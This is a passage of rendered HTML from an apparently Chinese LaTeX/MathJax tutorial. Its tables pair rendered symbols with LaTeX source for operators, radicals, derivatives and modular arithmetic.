mathvariant="normal">coth</mi><mo>⁡</mo><mi>n</mi></mrow><annotation encoding="application/x-tex">\operatorname{sh}k, \operatorname{ch}l, \operatorname{th}m, \operatorname{coth}n</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm">h</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03148em;">k</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">c</span><span class="mord mathrm">h</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.01968em;">l</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">t</span><span class="mord mathrm">h</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">m</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">c</span><span class="mord mathrm">o</span><span class="mord mathrm">t</span><span class="mord mathrm">h</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">n</span></span></span></span></td><td style="text-align:left">\operatorname{sh}k, \operatorname{ch}l, \operatorname{th}m, \operatorname{coth}n</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">argsh</mi><mo>⁡</mo><mi>o</mi><mo separator="true">,</mo><mi mathvariant="normal">argch</mi><mo>⁡</mo><mi>p</mi><mo separator="true">,</mo><mi mathvariant="normal">argth</mi><mo>⁡</mo><mi>q</mi></mrow><annotation encoding="application/x-tex">\operatorname{argsh}o, \operatorname{argch}p, \operatorname{argth}q</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop"><span class="mord mathrm">a</span><span class="mord mathrm">r</span><span class="mord mathrm" style="margin-right:0.01389em;">g</span><span class="mord mathrm">s</span><span class="mord mathrm">h</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">o</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">a</span><span class="mord mathrm">r</span><span class="mord mathrm" style="margin-right:0.01389em;">g</span><span class="mord mathrm">c</span><span class="mord mathrm">h</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">p</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop"><span class="mord mathrm">a</span><span class="mord mathrm">r</span><span class="mord mathrm" style="margin-right:0.01389em;">g</span><span class="mord mathrm">t</span><span class="mord mathrm">h</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">q</span></span></span></span></td><td style="text-align:left">\operatorname{argsh}o, \operatorname{argch}p, \operatorname{argth}q</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">sgn</mi><mo>⁡</mo><mi>r</mi><mo separator="true">,</mo><mrow><mo fence="true">∣</mo><mi>s</mi><mo fence="true">∣</mo></mrow></mrow><annotation encoding="application/x-tex">\operatorname{sgn}r, \left\vert s \right\vert</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop"><span class="mord mathrm">s</span><span class="mord mathrm" style="margin-right:0.01389em;">g</span><span class="mord mathrm">n</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="minner"><span class="mopen delimcenter" style="top:0em;">∣</span><span class="mord mathnormal">s</span><span class="mclose delimcenter" style="top:0em;">∣</span></span></span></span></span></td><td style="text-align:left">\operatorname{sgn}r, \left\vert s \right\vert</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>min</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>max</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo separator="true">,</mo><mi>y</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\min(x,y), \max(x,y)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">min</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mop">max</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mclose">)</span></span></span></span></td><td style="text-align:left">\min(x,y), \max(x,y)</td></tr></tbody></table><p>**注意：**LaTeX和MathJax支持的操作符有限，如有特殊操作符，可以使用<code>\operatorname&#123;&#125;</code> 命令自定义，例如</p><pre class="line-numbers language-none"><code class="language-none">\operatorname&#123;mydefine&#125;x<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mi mathvariant="normal">mydefine</mi><mo>⁡</mo><mi>x</mi></mrow><annotation encoding="application/x-tex">\operatorname{mydefine}x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mop"><span class="mord mathrm">m</span><span class="mord mathrm" style="margin-right:0.01389em;">y</span><span class="mord mathrm">d</span><span class="mord mathrm">e</span><span class="mord mathrm" style="margin-right:0.07778em;">f</span><span class="mord mathrm">i</span><span class="mord mathrm">n</span><span class="mord mathrm">e</span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">x</span></span></span></span></span></p><h3 id="223-根式-radicals"><a class="markdownIt-Anchor" href="#223-根式-radicals"></a> 2.2.3 根式 Radicals</h3><table><thead><tr><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi mathvariant="normal">√</mi></mrow><annotation encoding="application/x-tex">\surd</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.2em;"></span><span class="mord">√</span></span></span></span></td><td style="text-align:left">\surd</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msqrt><mi>π</mi></msqrt></mrow><annotation encoding="application/x-tex">\sqrt{\pi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.23972em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8002800000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span><span style="top:-2.76028em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.23972em;"><span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\sqrt{\pi}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mroot><mi>π</mi><mi>n</mi></mroot></mrow><annotation encoding="application/x-tex">\sqrt[n]{\pi}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.23972em;"></span><span class="mord sqrt"><span class="root"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.5516160000000001em;"><span style="top:-2.836336em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size6 size1 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">n</span></span></span></span></span></span></span></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8002800000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathnormal" style="margin-right:0.03588em;">π</span></span></span><span style="top:-2.76028em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221l0 -0c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47zM834 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.23972em;"><span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\sqrt[n]{\pi}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mroot><mfrac><mrow><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><msup><mi>y</mi><mn>3</mn></msup></mrow><mn>2</mn></mfrac><mn>3</mn></mroot></mrow><annotation encoding="application/x-tex">\sqrt[3]{\frac{x^3+y^3}{2}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.84em;vertical-align:-0.5432359999999998em;"></span><span class="mord sqrt"><span class="root"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7743368000000002em;"><span style="top:-2.9521168em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size6 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2967640000000002em;"><span class="svg-align" style="top:-3.8em;"><span class="pstrut" style="height:3.8em;"></span><span class="mord" style="padding-left:1em;"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9685280000000001em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mbin mtight">+</span><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.7463142857142857em;"><span style="top:-2.786em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span><span style="top:-3.256764em;"><span class="pstrut" style="height:3.8em;"></span><span class="hide-tail" style="min-width:1.02em;height:1.8800000000000001em;"><svg width='400em' height='1.8800000000000001em' viewBox='0 0 400000 1944' preserveAspectRatio='xMinYMin slice'><path d='M983 90l0 -0c4,-6.7,10,-10,18,-10 H400000v40H1013.1s-83.4,268,-264.1,840c-180.7,572,-277,876.3,-289,913c-4.7,4.7,-12.7,7,-24,7s-12,0,-12,0c-1.3,-3.3,-3.7,-11.7,-7,-25c-35.3,-125.3,-106.7,-373.3,-214,-744c-10,12,-21,25,-33,39s-32,39,-32,39c-6,-5.3,-15,-14,-27,-26s25,-30,25,-30c26.7,-32.7,52,-63,76,-91s52,-60,52,-60s208,722,208,722c56,-175.3,126.3,-397.3,211,-666c84.7,-268.7,153.8,-488.2,207.5,-658.5c53.7,-170.3,84.5,-266.8,92.5,-289.5zM1001 80h400000v40h-400000z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.5432359999999998em;"><span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\sqrt[3]{\frac{x<sup>3+y</sup>3}{2}}</td></tr></tbody></table><h3 id="224-微分与导数-differentials-and-derivatives"><a class="markdownIt-Anchor" href="#224-微分与导数-differentials-and-derivatives"></a> 2.2.4 微分与导数 Differentials and derivatives</h3><table><thead><tr><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>t</mi><mo separator="true">,</mo><mi mathvariant="normal">d</mi><mi>t</mi><mo separator="true">,</mo><mi mathvariant="normal">∂</mi><mi>t</mi><mo separator="true">,</mo><mi mathvariant="normal">∇</mi><mi>ψ</mi></mrow><annotation encoding="application/x-tex">dt, \mathrm{d}t, \partial t, \nabla\psi</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8888799999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathrm">d</span></span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord" style="margin-right:0.05556em;">∂</span><span class="mord mathnormal">t</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">∇</span><span class="mord mathnormal" style="margin-right:0.03588em;">ψ</span></span></span></span></td><td style="text-align:left">dt, \mathrm{d}t, \partial t, \nabla\psi</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>d</mi><mi>y</mi><mi mathvariant="normal">/</mi><mi>d</mi><mi>x</mi><mo separator="true">,</mo><mi mathvariant="normal">d</mi><mi>y</mi><mi mathvariant="normal">/</mi><mi mathvariant="normal">d</mi><mi>x</mi><mo separator="true">,</mo><mfrac><mrow><mi>d</mi><mi>y</mi></mrow><mrow><mi>d</mi><mi>x</mi></mrow></mfrac><mo separator="true">,</mo><mfrac><mrow><mi mathvariant="normal">d</mi><mi>y</mi></mrow><mrow><mi mathvariant="normal">d</mi><mi>x</mi></mrow></mfrac><mo separator="true">,</mo><mfrac><msup><mi mathvariant="normal">∂</mi><mn>2</mn></msup><mrow><mi mathvariant="normal">∂</mi><msub><mi>x</mi><mn>1</mn></msub><mi mathvariant="normal">∂</mi><msub><mi>x</mi><mn>2</mn></msub></mrow></mfrac><mi>y</mi></mrow><annotation encoding="application/x-tex">dy/dx, \mathrm{d}y/\mathrm{d}x, \frac{dy}{dx}, \frac{\mathrm{d}y}{\mathrm{d}x}, \frac{\partial^2}{\partial x_1\partial x_2}y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.4630199999999998em;vertical-align:-0.44509999999999994em;"></span><span class="mord mathnormal">d</span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">/</span><span class="mord mathnormal">d</span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathrm">d</span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="mord">/</span><span class="mord"><span class="mord mathrm">d</span></span><span class="mord mathnormal">x</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322159999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.9322159999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">d</span></span><span class="mord mathnormal mtight">x</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mathrm mtight">d</span></span><span class="mord mathnormal mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.345em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.01792em;"><span style="top:-2.655em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mtight"><span class="mord mathnormal mtight">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8913142857142857em;"><span style="top:-2.931em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.44509999999999994em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span></span></span></td><td style="text-align:left">dy/dx, \mathrm{d}y/\mathrm{d}x, \frac{dy}{dx}, \frac{\mathrm{d}y}{\mathrm{d}x}, \frac{\partial^2}{\partial x_1\partial x_2}y</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mo mathvariant="normal">′</mo><mo separator="true">,</mo><mi mathvariant="normal">‵</mi><mo separator="true">,</mo><msup><mi>f</mi><mo mathvariant="normal">′</mo></msup><mo separator="true">,</mo><msup><mi>f</mi><mo mathvariant="normal" lspace="0em" rspace="0em">′</mo></msup><mo separator="true">,</mo><msup><mi>f</mi><mrow><mo mathvariant="normal">′</mo><mo mathvariant="normal">′</mo></mrow></msup><mo separator="true">,</mo><msup><mi>f</mi><mrow><mo stretchy="false">(</mo><mn>3</mn><mo stretchy="false">)</mo></mrow></msup><mo separator="true">,</mo><mover accent="true"><mi>y</mi><mo>˙</mo></mover><mo separator="true">,</mo><mover accent="true"><mi>y</mi><mo>¨</mo></mover></mrow><annotation encoding="application/x-tex">\prime, \backprime, f^\prime, f&#x27;, f&#x27;&#x27;, f^{(3)}, \dot y, \ddot y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0824399999999998em;vertical-align:-0.19444em;"></span><span class="mord">′</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord amsrm">‵</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.751892em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">′</span><span class="mord mtight">′</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10764em;">f</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8879999999999999em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mopen mtight">(</span><span class="mord mtight">3</span><span class="mclose mtight">)</span></span></span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.08333000000000002em;"><span class="mord">˙</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord accent"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.66786em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">y</span></span><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="accent-body" style="left:-0.19444em;"><span class="mord">¨</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span></span></td><td style="text-align:left">\prime, \backprime, f^\prime, f’, f’', f^{(3)}, \dot y, \ddot y</td></tr></tbody></table><h3 id="225-同余与模算术-modular-arithmetic"><a class="markdownIt-Anchor" href="#225-同余与模算术-modular-arithmetic"></a> 2.2.5 同余与模算术 Modular arithmetic</h3><table><thead><tr><th style="text-align:left">样式</th><th style="text-align:left">LaTeX</th></tr></thead><tbody><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>s</mi><mi>k</mi></msub><mo>≡</mo><mn>0</mn><mspace></mspace><mspace width="0.4444444444444444em"/><mo stretchy="false">(</mo><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow><mspace width="0.3333333333333333em"/><mi>m</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">s_k \equiv 0 \pmod{m}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.61375em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">s</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.03148em;">k</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">0</span><span class="mspace allowbreak"></span><span class="mspace" style="margin-right:0.4444444444444444em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord"><span class="mord mathrm">m</span><span class="mord mathrm">o</span><span class="mord mathrm">d</span></span></span><span class="mspace" style="margin-right:0.3333333333333333em;"></span><span class="mord mathnormal">m</span><span class="mclose">)</span></span></span></span></td><td style="text-align:left">s_k \equiv 0 \pmod{m}</td></tr><tr><td style="text-align:left"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>a</mi><mtext> </mtext><mo lspace="0.22em" rspace="0.22em"><mrow><mi mathvariant="normal">m</mi><mi mathvariant="normal">o</mi><mi mathvariant="normal">d</mi></mrow></mo><mtext> </mtext><mi>b</mi></mrow><annotation encoding="application/x-tex">a \bmod b</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" 